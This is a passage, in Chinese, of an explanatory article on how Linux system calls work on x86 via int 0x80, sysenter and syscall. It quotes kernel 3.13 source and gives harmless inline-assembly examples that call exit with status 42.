+<p>最大的原因就在于一些系统调用在执行之前或之后会有额外的代码需要在glibc中执行。</p>
+<p>在下面的例子中，我们会用到<code>exit</code>系统调用。你可以在<code>exit</code>被调用时利用<a href="http://man7.org/linux/man-pages/man3/atexit.3.html" target="_blank" rel="external"><code>atexit</code></a>注册处理函数。</p>
+<p>这些处理函数都是被glibc调用的，注意，不是kernel. 因此，当你自己写汇编代码调用<code>exit</code>时，你自己注册的处理函数是不会执行的，因为你绕过了glibc。</p>
+<p>然而，写汇编代码来执行系统调用是个不错的学习经验。</p>
+<h2 id="传统系统调用"><a href="#传统系统调用" class="headerlink" title="传统系统调用"></a>传统系统调用</h2><p>从上文的准备知识中，我们可以知道两件事情：</p>
+<ol>
+<li>可以通过软件中断来触发内核的执行</li>
+<li>可以通过汇编指令 <code>int</code> 来产生软件中断</li>
+</ol>
+<p>结合这两个概念我们再去了解Linux系统中的传统系统调用接口。</p>
+<p>Linux内核分配了一个特殊的软件中断号，让用户程序进入到内核中执行系统调用。</p>
+<p>Linux内核会为中断处理号 128(0x80)注册一个中断处理器<code>ia32-syscall</code>. 通过代码来看看到底怎么做的。</p>
+<p>内核3.13.0源码中的<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/traps.c#L770" target="_blank" rel="external"><code>arch/x86/kernel/traps.c</code></a>中有个<code>trap_init</code>函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">init <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="comment">/* ..... other code ... */</span></div><div class="line"></div><div class="line">        set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall);</div></pre></td></tr></table></figure>
+<p>其中，<code>IA32_SYSCALL_VECTOR</code>在<code>arch/x86/include/asm/irq_vectors.h</code>中被定义为 <code>0x80</code>.</p>
+<p>进一步看，既然内核预留了一个软件中断供用户程序来触发内核的执行，那在这么多的系统调用中，内核又是如何知道该执行哪一个呢？</p>
+<p>这时，用户程序需要在<code>eax</code>寄存器中放入系统调用号。系统调用相关的其它参数会被传入到剩余的通用寄存器中。</p>
+<p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L378-L397" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中的注释对此有具体的介绍:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">* Emulated IA32 system calls via <span class="keyword">int</span> <span class="number">0x80</span>.</div><div class="line">*</div><div class="line">* Arguments:</div><div class="line">* %eax System call number.</div><div class="line">* %ebx Arg1</div><div class="line">* %ecx Arg2</div><div class="line">* %edx Arg3</div><div class="line">* %esi Arg4</div><div class="line">* %edi Arg5</div><div class="line">* %ebp Arg6    [note: not saved in the <span class="built_in">stack</span> frame, should not be touched]</div><div class="line">*</div></pre></td></tr></table></figure>
+<p>现在我们知道了如何执行系统调用以及如何传递这些参数，可以开始试着写一些内联汇编代码。</p>
+<h3 id="自己编写汇编代码使用传统系统调用"><a href="#自己编写汇编代码使用传统系统调用" class="headerlink" title="自己编写汇编代码使用传统系统调用"></a>自己编写汇编代码使用传统系统调用</h3><p>要使用传统系统调用，你可以写一小段内联汇编代码，尽管从学习的角度来看这很有用，我绝不鼓励读者们自己编写汇编代码使用系统调用。</p>
+<p>在下面的例子中，我们会试着去执行<code>exit</code>系统调用，它只需要一个参数：退出状态.</p>
+<p>首先，我们需要找到<code>exit</code>的系统调用号。Linux内核中有个文件将每个系统调用列在了一张表中。很多脚本在构建的时候会处理此文件以产生一些头文件供用户使用。</p>
+<p>看看上述的表格，可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_32.tbl</code></a>找到:</p>
+<pre><code>1 i386 exit sys_exit
+</code></pre><p>可见 <code>exit</code>的系统调用号是1. 根据上文所述，我们需要将系统调用号写入<code>eax</code>寄存器中，以及第一个参数（退出状态)写入<code>ebx</code>寄存器中。</p>
+<p>下面介绍的一段C代码（含有一些内联汇编）做的就是上面的工作。可以看到退出状态是’42’.</p>
+<p>（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有用，让那些之前从没见过GCC内联汇编代码的人也可以用下面的例子作为参考）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> syscall_nr = <span class="number">1</span>;</div><div class="line">  <span class="keyword">int</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  <span class="keyword">asm</span> (<span class="string">"movl %0, %%eax\n"</span></div><div class="line">             <span class="string">"movl %1, %%ebx\n"</span></div><div class="line">       <span class="string">"int $0x80"</span></div><div class="line">    : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">      <span class="comment">/* (none) */</span></div><div class="line">    : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">      <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status)</div><div class="line">    : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">      <span class="string">"eax"</span>, <span class="string">"ebx"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来，编译，执行，然后检查退出状态。</p>
+<pre><code>$ gcc -o test test.c
+$ ./test
+$ echo $?
+42
+</code></pre><p>成功了！ 这就是我们利用软件中断来执行<code>exit</code>系统调用的全过程。</p>
+<h2 id="内核层面：int-0x80入口"><a href="#内核层面：int-0x80入口" class="headerlink" title="内核层面：int $0x80入口"></a>内核层面：<code>int $0x80</code>入口</h2><p>目前为止，我们知道了如何从用户程序中触发系统调用。<br>下面来看看内核如何利用系统调用号执行系统调用中的代码。</p>
+<p>回顾前文，内核调用<code>ia32_syscall</code>来注册系统调用处理函数。</p>
+<p>该函数是用汇编实现的，定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L426" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中。该函数做了很多事情，但最重要的还是它触发了实际的系统调用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ia32_do_call:</div><div class="line">        <span class="function">IA32_ARG_FIXUP</span></div><div class="line">        call *<span class="title">ia32_sys_call_table</span><span class="params">(,%rax,<span class="number">8</span>)</span> <span class="meta"># xxx: rip relative</span></div></pre></td></tr></table></figure>
+<p>注意到，<code>IA32_ARG_FIXUP</code> 是一个宏，做的是重新处理初始参数，以让当前的系统调用层能正确的理解这些参数。</p>
+<p><code>ia32_sys_call_table</code> 是<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/syscall_ia32.c#L18-L25" target="_blank" rel="external"><code>arch/x86/ia32/syscall_ia32.c</code></a>中定义的一张表。注意代码中的最后一行 <code>#include</code>. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">sys_call_ptr_t</span> ia32_sys_call_table[__NR_ia32_syscall_max+<span class="number">1</span>] = &#123;</div><div class="line">        <span class="comment">/*</span></div><div class="line">         * Smells like a compiler bug -- it doesn't work</div><div class="line">         * when the &amp; below is removed.</div><div class="line">         */</div><div class="line">        [<span class="number">0</span> ... __NR_ia32_syscall_max] = &amp;compat_ni_syscall,</div><div class="line">#include &lt;<span class="keyword">asm</span>/syscalls_32.h&gt;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>回想一下前面提到在 <a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_32.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_32.tbl</code></a> 中定义的系统调用表。</p>
+<p>一些脚本在编译的时候使用这张表生成<code>syscalls_32.h</code>头文件。头文件中由一些有效的C代码组成，就像上面一样，以<code>#include</code>的形式插入到<code>ia32_sys_call_table</code>中，里面含有系统调用号引用的函数地址。</p>
+<p>到目前为止，你已经知道如何通过传统系统调用进入内核了。</p>
+<h2 id="iret-从传统系统调用返回"><a href="#iret-从传统系统调用返回" class="headerlink" title="iret: 从传统系统调用返回"></a>iret: 从传统系统调用返回</h2><p>了解了如何通过软件中断进入内核执行系统调用之后，应该思考，内核应该如何返回到用户程序中并恢复其原始特权级呢？</p>
+<p>查阅 <a href="ftp://download.intel.com/design/processor/manuals/253668.pdf" target="_blank" rel="external">Intel Software Developer’s Manual</a> （警告：PDF很大), 可以找到一些有用的图表，描述了当特权级转变时，程序栈的状态。</p>
+<p>请看图：</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/isr_stack.png" alt="isr-stack"></p>
+<p>当用户程序利用软件中断将执行环境转变到内核函数<code>ia32_syscall</code>中时，发生特权级转变。上图描述的就是当进入到<code>ia32_syscall</code>中时栈的状态。</p>
+<p>这就意味着在<code>ia32_syscall</code>执行前，返回地址和CPU标志(用来编码特权级)以及其它的信息都被存储在栈中。</p>
+<p>如此一来，为了恢复用户程序的执行，内核只需要将栈中的这些值拷贝到相应的寄存器中。</p>
+<p>好了，这些都是如何做到的？</p>
+<p>有很多方法可以做到，其中最简单的就是使用<code>iret</code>指令。</p>
+<p>Intel指令集手册中指出，<code>iret</code>指令从栈中将返回地址和保存的寄存器的值按照初始顺序pop出来。</p>
+<pre><code>As with a real-address mode interrupt return, the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure.
+</code></pre><p>在Linux内核中找到相关的代码有一点点困难，因为它们隐藏在许多宏中,类似的标志以及系统调用退出的追踪信息都会经过额外的处理。</p>
+<p>遍历内核中汇编存根里面所有的宏最终会找到<code>iret</code>，用来从系统调用返回到用户程序。</p>
+<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L1042-L1043" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>中可以找到<code>irq_return</code>:</p>
+<pre><code>irq_return:
+INTERRUPT_RETURN
+</code></pre><p>其中<code>INTERRUPT_RETURN</code>在 <a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L132" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>被定义为<code>iretq</code></p>
+<p>到目前为止，你已经知道传统系统调用是如何工作的了。</p>
+<p>##快速系统调用</p>
+<p>传统的系统调用过程看起来似乎很合理，但最新的方法是不需要软件中断来触发系统调用的，而且比使用软件中断更快。</p>
+<p>这两种快速的方法都分别包含两条指令。一条指令用来进入内核，另一条则用来退出内核。两种方法都在Intel CPU的文档中定义为”快速系统调用”.</p>
+<p>然而，Intel和AMD在具体实现的时候，针对CPU分别运行在32位和64位时该采用哪种方法才有更效的问题上产生了分歧。</p>
+<p>为了在Intel和AMD处理器中最大化兼容性：</p>
+<p>   32位系统中使用：<code>sysenter</code>和<code>sysexit</code><br>   64位系统中使用：<code>syscall</code>和<code>sysret</code></p>
+<h3 id="32位快速系统调用"><a href="#32位快速系统调用" class="headerlink" title="32位快速系统调用"></a>32位快速系统调用</h3><h4 id="sysenter-sysexit"><a href="#sysenter-sysexit" class="headerlink" title="sysenter/sysexit"></a><code>sysenter</code>/<code>sysexit</code></h4><p>  用<code>sysenter</code>触发系统调用比传统中断方法要复杂一些，其涉及到用户程序(通过glibc）与内核之间更多的协调问题。</p>
+<p>  我们逐步来了解这些细节。首先来看看Intel指令集参考手册中是如何描述<code>sysenter</code>以及如何使用它的。</p>
+<p>  看下面：</p>
+<pre><code>  Prior to executing the SYSENTER instruction, software must specify the privilege level 0 code segment and code entry point, and the privilege level 0 stack segment and stack pointer by writing values to the following MSRs:
+
+• IA32_SYSENTER_CS (MSR address 174H) — The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment. This value is also used to determine the segment selector of the privilege level 0 stack segment (see the Operation section). This value cannot indicate a null selector.
+
+• IA32_SYSENTER_EIP (MSR address 176H) — The value of this MSR is loaded into RIP (thus, this value references the first instruction of the selected operating procedure or routine). In protected mode, only bits 31:0 are loaded.
+
+• IA32_SYSENTER_ESP (MSR address 175H) — The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the privilege level 0 stack). This value cannot represent a non-canonical address. In protected mode, only bits 31:0 are loaded.
+</code></pre><p>换句话说：为了让内核接收到<code>sysenter</code>触发的系统调用，内核必须设置3个特殊模块寄存器（MSRs). 其中最重要的是 <code>IA32_SYSENTER_EIP</code>(地址是0x176). 该MSR代表的是用户程序在执行 <code>sysenter</code>指令时，内核将要执行的函数地址。</p>
+<p>我们可以在内核代码<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32-setup.c#L240" target="_blank" rel="external"><code>arch/x86/vdso/vdso32-setup.c</code></a>中找到写MSR的相关代码：</p>
+<pre><code>void enable_sep_cpu(void)
+</code></pre><p>{<br>        /<em> … other code … </em>/</p>
+<pre><code>wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) ia32_sysenter_target, 0);
+</code></pre><p><code>MSR_IA32_SYSENTER_EIP</code>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L54" target="_blank" rel="external"><code>arch/x86/include/uapi/asm/msr-index.h</code></a>中定义为 <code>0x00000176</code>。</p>
+<p>类似传统软件中断型的系统调用, 使用<code>sysenter</code>触发系统调用时也定义了一些规范。</p>
+<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L99-L117" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>的注释中可以找到相关内容:</p>
+<pre><code>* 32bit SYSENTER instruction entry.
+ *
+ * Arguments:
+ * %eax System call number.
+ * %ebx Arg1
+ * %ecx Arg2
+ * %edx Arg3
+ * %esi Arg4
+ * %edi Arg5
+ * %ebp user stack
+ * 0(%ebp) Arg6
+</code></pre><p>回想一下，传统的系统调用方法包括返回到用户程序的机制：<code>iret</code>指令。</p>
+<p>要理解让<code>sysenter</code>正确执行的逻辑不太简单，因为不像软件中断,<code>sysenter</code>并不存储返回地址。</p>
+<p>实际上，在执行<code>sysenter</code>指令之前，内核要做的一些记录工作都是会随着时间而变化的(如果已经改变了，你就会看到下文中将要描述的bugs了)</p>
+<p>为了兼容未来特性的变化，用户程序使用内核中的函数<br><code>_ _kernel_vsyscall</code>。当调用该函数的进程执行时，会被映射到每个用户进程空间中去。</p>
+<p>这听起来有点诡异。它是内核中的代码，却在用户层执行。</p>
+<p>实际上，<code>_ _kernel_vsyscall</code>是vDSO(virtual Dynamic Shared Object)的一部分，而vDSO允许程序在用户层中执行内核代码。</p>
+<p>后文中会具体介绍什么是vDSO，vDSO做了什么以及工作原理是什么。</p>
+<p>我们先来了解<code>_ _kernel_vsyscall</code>的一些细节。</p>
+<h4 id="kernel-vsyscall内幕"><a href="#kernel-vsyscall内幕" class="headerlink" title="_ _kernel_vsyscall内幕"></a><code>_ _kernel_vsyscall</code>内幕</h4><p><code>_ _kernel_vsyscall</code>函数封装了<code>sysenter</code>调用的规范，定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso32/sysenter.S#L31-L40" target="_blank" rel="external"><code>arch/x86/vdso/vdso32/sysenter.S</code></a>:</p>
+<pre><code>__kernel_vsyscall:
+.LSTART_vsyscall:
+    push %ecx
+.Lpush_ecx:
+    push %edx
+.Lpush_edx:
+    push %ebp
+.Lenter_kernel:
+    movl %esp,%ebp
+    sysenter
+</code></pre><p><code>_ _kernel_vsyscall</code>既然是vDSO(也被称为共享库)的一部分，那用户程序是如何在运行时定位该函数地址的呢？</p>
+<p><code>_ _kernel_vsyscall</code>函数的地址被写入到 <a href="https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html" target="_blank" rel="external">ELF 辅助向量</a>, 用户程序以及库函数(主要指glibc)可以在这里找到其地址并使用。</p>
+<p>以下方法可用来查找ELF辅助向量：</p>
+<ol>
+<li>使用<a href="http://man7.org/linux/man-pages/man3/getauxval.3.html" target="_blank" rel="external"><code>getauxval</code></a>函数，带有<code>AT_SYSINFO</code>参数.</li>
+<li>迭代搜索环境变量,然后从内存中解析这些变量.</li>
+</ol>
+<p>第一种方法较为简单，但glibc 2.16前的版本不支持。 下文例子中介绍的代码中实现的是第二种方法。</p>
+<p>从有关<code>__kernel_vsyscall</code>的代码中可以看出，在执行<code>sysenter</code>指令之前<code>__kernel_vsyscall</code>会做一些记录工作。</p>
+<p>因此，我们需要做的就是手动利用<code>sysenter</code>进入到内核中：</p>
+<p>  . 在ELF辅助向量中找到<code>AT_SYSINFO</code>,也就是<code>_ _kernel_vsyscall</code>被写入的地址<br>  . 像传统系统调用一样，将系统调用号和参数写入寄存器中<br>  . 调用<code>_ _kernel_vsyscall</code>函数</p>
+<p>你可能从来没写过属于你自己的<code>sysenter</code>封装函数，那是因为内核利用<code>sysenter</code>进入和退出系统调用的规范是会变化的，到那时候你的代码就会崩溃了。</p>
+<p>在开始用<code>sysenter</code>触发系统调用前，你都要调用<code>_ _kernel_vsyscall</code>函数。</p>
+<p>那么，让我们开始吧。</p>
+<h4 id="自己写汇编使用sysenter"><a href="#自己写汇编使用sysenter" class="headerlink" title="自己写汇编使用sysenter"></a>自己写汇编使用sysenter</h4><p>继续利用前面传统系统调用的例子，我们调用<code>exit</code>，退出状态是42.</p>
+<p><code>exit</code>的系统调用号是1. 根据前文描述，我们只需要将系统调用号写进<code>eax</code>寄存器中，并把第一个参数(退出状态)写到<code>ebx</code>寄存器中。</p>
+<p>（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有趣，让那些之前没见过GCC内联汇编代码的人也可以用下面的例子作为参考）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> syscall_nr = <span class="number">1</span>;</div><div class="line">  <span class="keyword">int</span> exit_status = <span class="number">42</span>;</div><div class="line">  Elf32_auxv_t *auxv;</div><div class="line"></div><div class="line">  <span class="comment">/* auxilliary vectors are located after the end of the environment</span></div><div class="line">   * variables</div><div class="line">   *</div><div class="line">   * check this helpful diagram: https://static.lwn.net/images/2012/auxvec.png</div><div class="line">   */</div><div class="line">  <span class="keyword">while</span>(*envp++ != <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* envp is now pointed at the auxilliary vectors, since we've iterated</span></div><div class="line">   * through the environment variables.</div><div class="line">   */</div><div class="line">  <span class="keyword">for</span> (auxv = (Elf32_auxv_t *)envp; auxv-&gt;a_type != AT_NULL; auxv++)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span>( auxv-&gt;a_type == AT_SYSINFO) &#123;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">/* <span class="doctag">NOTE:</span> in glibc 2.16 and higher you can replace the above code with</span></div><div class="line">   * a call to getauxval(3):  getauxval(AT_SYSINFO)</div><div class="line">   */</div><div class="line"></div><div class="line">  <span class="keyword">asm</span>(</div><div class="line">      <span class="string">"movl %0,  %%eax    \n"</span></div><div class="line">      <span class="string">"movl %1, %%ebx    \n"</span></div><div class="line">      <span class="string">"call *%2          \n"</span></div><div class="line">      : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">        <span class="comment">/* (none) */</span></div><div class="line">      : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">        <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status), <span class="string">"m"</span> (auxv-&gt;a_un.a_val)</div><div class="line">      : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">        <span class="string">"eax"</span>, <span class="string">"ebx"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来，编译，执行，然后检查退出状态:</p>
+<pre><code>$ gcc -m32 -o test test.c
+$ ./test
+$ echo $?
+42
+</code></pre><p>成功了! 我们利用 <code>sysenter</code>触发了<code>exit</code>系统调用，而不需要引发软件中断。</p>
+<h4 id="内核层面：sysenter入口"><a href="#内核层面：sysenter入口" class="headerlink" title="内核层面：sysenter入口"></a>内核层面：<code>sysenter</code>入口</h4><p>目前我们已经知道用户程序如何通过<code>_ _kernel_vsyscall</code>函数利用<code>sysenter</code>触发系统调用，下面来看看内核如何利用系统调用号来执行系统调用中的代码。</p>
+<p>回想前面的章节，内核调用<code>ia32_sysenter_target</code>来注册系统调用处理函数。</p>
+<p>此函数在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L162-L163" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中以汇编代码实现。我们来看看<code>eax</code>寄存器中的值是在哪里被用来执行系统调用的:</p>
+<pre><code>sysenter_dispatch:
+    call    *ia32_sys_call_table(,%rax,8)
+</code></pre><p>这段代码和前文传统系统调用模式的代码很类似：名为<code>ia32_sys_call_table</code>的表存储着系统调用号。</p>
+<p>在所有必要的记录工作完成后，传统系统调用模型以及<code>sysenter</code>系统调用模型采用相同的机制和系统调用表来分配系统调用。</p>
+<p>参照 <code>int $0x80</code>（内核层面：int $0x80入口这一章节)，可以了解到<code>ia32_sys_call_table</code> 是如何定义和构造的。</p>
+<p>以上内容就是如何通过<code>sysenter</code>系统调用进入内核的全部过程。</p>
+<h3 id="sysexit-从sysenter中返回"><a href="#sysexit-从sysenter中返回" class="headerlink" title="sysexit: 从sysenter中返回"></a>sysexit: 从sysenter中返回</h3><p>内核利用<code>sysexit</code>指令将执行环境恢复到用户程序。</p>
+<p><code>sysexit</code>指令的使用不像<code>iret</code>那么直接。调用者需要将返回地址写入<code>rdx</code>寄存器中，并将栈指针写入<code>rcx</code>寄存器。</p>
+<p>这就意味着你的代码中需要计算执行环境要返回的地址，保存地址值，并在调用<code>sysexit</code>前能恢复。</p>
+<p>可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L169-L185" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a> 找到相关代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sysexit_from_sys_call:</div><div class="line">        andl    $~TS_COMPAT,TI_status+THREAD_INFO(%rsp,RIP-ARGOFFSET)</div><div class="line">        <span class="comment">/* clear IF, that popfq doesn't enable interrupts early */</span></div><div class="line">        andl  $~<span class="number">0x200</span>,EFLAGS-R11(%rsp)</div><div class="line">        movl    RIP-R11(%rsp),%edx              <span class="comment">/* User %eip */</span></div><div class="line">        CFI_REGISTER rip,rdx</div><div class="line">        RESTORE_ARGS <span class="number">0</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></div><div class="line">        xorq    %r8,%r8</div><div class="line">        xorq    %r9,%r9</div><div class="line">        xorq    %r10,%r10</div><div class="line">        xorq    %r11,%r11</div><div class="line">        popfq_cfi</div><div class="line">        <span class="comment">/*CFI_RESTORE rflags*/</span></div><div class="line">        popq_cfi %rcx                           <span class="comment">/* User %esp */</span></div><div class="line">        CFI_REGISTER rsp,rcx</div><div class="line">        TRACE_IRQS_ON</div><div class="line">        ENABLE_INTERRUPTS_SYSEXIT32</div></pre></td></tr></table></figure>
+<p><code>ENABLE_INTERRUPTS_SYSEXIT32</code>是定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L139-L143" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>的宏，其中含有<code>sysexit</code>指令。</p>
+<p>好了，你已经知道32位快速系统调用是如何工作的了。</p>
+<h3 id="64位快速系统调用"><a href="#64位快速系统调用" class="headerlink" title="64位快速系统调用"></a>64位快速系统调用</h3><p>下一步之旅就是去探索64位快速系统调用了。其分别利用<code>syscall</code> 、<code>sysret</code>指令进入系统调用、从系统调用中返回。</p>
+<h4 id="syscall-sysret"><a href="#syscall-sysret" class="headerlink" title="syscall/sysret"></a>syscall/sysret</h4><p>Intel指令集参考指南解释了<code>syscall</code>指令是如何工作的:</p>
+<pre><code>SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR (after saving the address of the instruction following SYSCALL into RCX).
+</code></pre><p>换句话说：为了让内核接收到系统调用，内核必须向<code>IA32_LSTAR</code> MSR注册当系统调用触发时要执行的代码地址。</p>
+<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/cpu/common.c#L1128" target="_blank" rel="external"><code>arch/x86/kernel/cpu/common.c</code></a> 可以找到相关代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="comment">/* ... other code ... */</span></div><div class="line">        wrmsrl(MSR_LSTAR, system_call);</div></pre></td></tr></table></figure>
+<p><code>MSR_LSTAR</code>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L9" target="_blank" rel="external"><code>arch/x86/include/uapi/asm/msr-index.h</code></a>定义为 0xc0000082。</p>
+<p>类似传统软件中断型的系统调用, 使用<code>syscall</code>触发系统调用时也定义了一些规范。</p>
+<p>用户程序需要将系统调用号写入<code>rax</code>寄存器中。系统调用的参数要c传入通用寄存器中。</p>
+<p><a href="http://www.x86-64.org/documentation/abi.pdf" target="_blank" rel="external">x86-64 ABI </a>章节A.2.1 对此有所描述:</p>
+<pre><code>1. User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
+2. A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.
+3. The number of the syscall has to be passed in register %rax.
+4. System-calls are limited to six arguments,no argument is passed directly on the stack.
+5. Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.
+6. Only values of class INTEGER or class MEMORY are passed to the kernel.
+</code></pre><p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L569-L591" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>的注释中也有相关介绍。</p>
+<p>现在我们已经知道了如何执行系统调用以及如何传递这些参数，开始着手写一些内联汇编代码。</p>
+<h3 id="自己写汇编使用syscall"><a href="#自己写汇编使用syscall" class="headerlink" title="自己写汇编使用syscall"></a>自己写汇编使用syscall</h3><p>基于前面介绍的例子，我们开始着手编写一小段含有内联汇编的C程序，代码中执行<code>exit</code>系统调用并传递退出状态：42.</p>
